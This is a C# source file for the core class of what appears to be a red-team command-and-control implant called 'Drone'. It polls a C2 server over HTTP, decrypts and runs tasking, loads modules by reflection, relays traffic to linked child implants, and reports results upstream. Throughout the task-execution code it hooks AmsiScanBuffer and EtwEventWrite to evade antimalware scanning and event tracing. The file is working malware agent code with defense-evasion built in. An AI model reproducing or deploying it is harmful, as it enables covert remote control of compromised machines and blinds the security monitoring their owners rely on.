using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Drone.SharpSploit.Evasion;
using Drone.Invocation.DynamicInvoke;
using Drone.Handlers;
using Drone.Models;
using Drone.Modules;

using MinHook;

namespace Drone
{
    public class Drone
    {
        private Metadata _metadata;
        private DroneConfig _config;
        private HookEngine _hookEngine;
        private Handler _handler;
        private Crypto _crypto;
        private bool _running;

        private readonly List<DroneModule> _modules = new();
        private readonly List<Handler> _children = new();
        private readonly Dictionary<string, CancellationTokenSource> _taskTokens = new();

        public delegate void Callback(DroneTask task, CancellationToken token);

        public void Start()
        {
            _config = Utilities.GenerateDefaultConfig();
            _metadata = Utilities.GenerateMetadata();
            _hookEngine = new HookEngine();
            _crypto = new Crypto();

            _handler = GetHandler;
            _handler.Init(_config, _metadata);

            var t = _handler.Start();

            LoadDefaultModules();

            _running = true;

            while (_running)
            {
                // check if handler has given up
                if (t.IsCompleted) return;
                
                // check children
                foreach (var child in _children)
                {
                    if (!child.GetInbound(out var childEnvelopes)) continue;
                    
                    foreach (var childEnvelope in childEnvelopes)
                        _handler.QueueOutbound(childEnvelope);  // shove them directly in the outbound queue
                }
                
                if (!_handler.GetInbound(out var envelopes))
                {
                    Thread.Sleep(100);                    
                    continue;
                }

                foreach (var envelope in envelopes)
                    HandleMessageEnvelope(envelope);
            }
        }

        private void HandleMessageEnvelope(MessageEnvelope envelope)
        {
            // if not for this drone, send to children
            if (envelope.Drone is not null && !envelope.Drone.Equals(_metadata.Guid))
            {
                foreach (var child in _children)
                    child.QueueOutbound(envelope);

                return;
            }
            
            // otherwise handle it
            var message = _crypto.DecryptEnvelope(envelope);

            switch (message.Type)
            {
                case C2Message.MessageType.DroneTask:
                {
                    var tasks = Convert.FromBase64String(message.Data).Deserialize<IEnumerable<DroneTask>>().ToArray();
                    if (tasks.Any()) HandleDroneTasks(tasks);
                    
                    break;
                }

                case C2Message.MessageType.NewLink:
                {
                    var reply = new C2Message(C2Message.MessageDirection.Upstream, C2Message.MessageType.NewLink, _metadata)
                    {
                        Data = Convert.ToBase64String(message.Metadata.Serialize())
                    };
                    
                    SendC2Message(reply);
                    
                    break;
                }

                // these shouldn't happen here
                case C2Message.MessageType.DroneModule: break;
                case C2Message.MessageType.DroneTaskUpdate: break;

                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private void HandleDroneTasks(IEnumerable<DroneTask> tasks)
        {
            foreach (var task in tasks)
                HandleDroneTask(task);
        }

        private void HandleDroneTask(DroneTask task)
        {
            var module = _modules.FirstOrDefault(m => m.Name.Equals(task.Module, StringComparison.OrdinalIgnoreCase));
            if (module is null)
            {
                SendError(task.TaskGuid, $"Module \"{task.Module}\" not found.");
                return;
            }
            
            var command = module.Commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));
            if (command is null)
            {
                SendError(task.TaskGuid, $"Command \"{task.Command}\" not found in Module \"{task.Module}\".");
                return;
            }

            // cancellation token for the task
            var token = new CancellationTokenSource();
            _taskTokens.Add(task.TaskGuid, token);
            
            var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
            var bypassEtw = _config.GetConfig<bool>("BypassEtw");

            Task.Factory.StartNew(() =>
            {
                try
                {
                    // handle evasion hooks
                    if (command.Hookable)
                    {
                        if (bypassAmsi)
                        {
                            if (Amsi.AmsiScanBufferOriginal is null) CreateAmsiBypassHook();
                            _hookEngine.EnableHook(Amsi.AmsiScanBufferOriginal);
                        }
                    
                        if (bypassEtw)
                        {
                            if (Etw.EtwEventWriteOriginal is null) CreateEtwBypassHook();
                            _hookEngine.EnableHook(Etw.EtwEventWriteOriginal);
                        }
                    }

                    // run the task
                    command.Callback.Invoke(task, token.Token);
                    
                    // unload hooks
                    if (command.Hookable)
                    {
                        if (bypassAmsi) _hookEngine.DisableHook(Amsi.AmsiScanBufferOriginal);
                        if (bypassEtw) _hookEngine.DisableHook(Etw.EtwEventWriteOriginal);
                    }
                    
                    // send task complete
                    SendTaskComplete(task.TaskGuid);
                }
                catch (Exception e)
                {
                    // if module throws, send error back
                    SendError(task.TaskGuid, e.Message);
                }
                finally
                {
                    token.Dispose();
                    _taskTokens.Remove(task.TaskGuid);
                }
            }, token.Token);
        }

        private void SendTaskRunning(string taskGuid)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Running);
            SendDroneTaskUpdate(update);
        }

        private void SendTaskComplete(string taskGuid)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Complete);
            SendDroneTaskUpdate(update);
        }
        
        public void SendUpdate(string taskGuid, string result)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Running, Encoding.UTF8.GetBytes(result));
            SendDroneTaskUpdate(update);
        }

        public void SendResult(string taskGuid, string result)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Running, Encoding.UTF8.GetBytes(result));
            SendDroneTaskUpdate(update);
        }

        public void SendError(string taskGuid, string error)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Aborted, Encoding.UTF8.GetBytes(error));
            SendDroneTaskUpdate(update);
        }

        public void SendDroneTaskUpdate(DroneTaskUpdate update)
        {
            var message = new C2Message(C2Message.MessageDirection.Upstream, C2Message.MessageType.DroneTaskUpdate, _metadata)
            {
                Data = Convert.ToBase64String(update.Serialize())
            };
            
            SendC2Message(message);
        }

        public void SendDroneData(string taskGuid, string serverModule, byte[] data)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Running, data)
            {
                ServerModule = serverModule
            };
            
            SendDroneTaskUpdate(update);
        }

        private void SendC2Message(C2Message message)
        {
            var envelope = _crypto.EncryptMessage(message);
            envelope.Drone = _metadata.Guid;
            
            _handler.QueueOutbound(envelope);
        }

        public void AbortTask(string taskGuid)
        {
            var token = _taskTokens[taskGuid];
            token.Cancel();
            _taskTokens.Remove(taskGuid);
        }

        public void AddChildDrone(Handler handler)
        {
            var message = new C2Message(C2Message.MessageDirection.Downstream, C2Message.MessageType.NewLink, _metadata);
            var envelope = _crypto.EncryptMessage(message);
            
            handler.QueueOutbound(envelope);
            handler.Start();
            _children.Add(handler);
        }

        private void LoadDroneModule(DroneModule module)
        {
            module.Init(this, _config, _hookEngine);
            _modules.Add(module);
            SendModuleLoaded(module);
        }

        public void LoadDroneModule(Assembly asm)
        {
            foreach (var type in asm.GetTypes())
            {
                if (!type.IsSubclassOf(typeof(DroneModule))) continue;
                var module = (DroneModule) Activator.CreateInstance(type);
                LoadDroneModule(module);
            }
        }

        private void SendModuleLoaded(DroneModule module)
        {
            var definition = Utilities.MapDroneModuleDefinition(module);
            var message = new C2Message(C2Message.MessageDirection.Upstream, C2Message.MessageType.DroneModule, _metadata)
            {
                Data = Convert.ToBase64String(definition.Serialize())
            };
            
            SendC2Message(message);
        }

        public void Stop()
        {
            _handler.Stop();
            _running = false;
        }

        private void CreateAmsiBypassHook()
        {
            // force dll to load
            _ = Generic.LoadModuleFromDisk("amsi.dll");
                            
            Amsi.AmsiScanBufferOriginal = _hookEngine.CreateHook(
                "amsi.dll",
                "AmsiScanBuffer",
                new Amsi.AmsiScanBufferDelegate(Amsi.AmsiScanBufferDetour));
        }
        
        private void CreateEtwBypassHook()
        {
            Etw.EtwEventWriteOriginal = _hookEngine.CreateHook(
                "ntdll.dll",
                "EtwEventWrite",
                new Etw.EtwEventWriteDelegate(Etw.EtwEventWriteDetour));
        }

        private void LoadDefaultModules()
        {
            var self = Assembly.GetExecutingAssembly();
            LoadDroneModule(self);
        }

        private static Handler GetHandler => new DefaultHttpHandler();
    }
}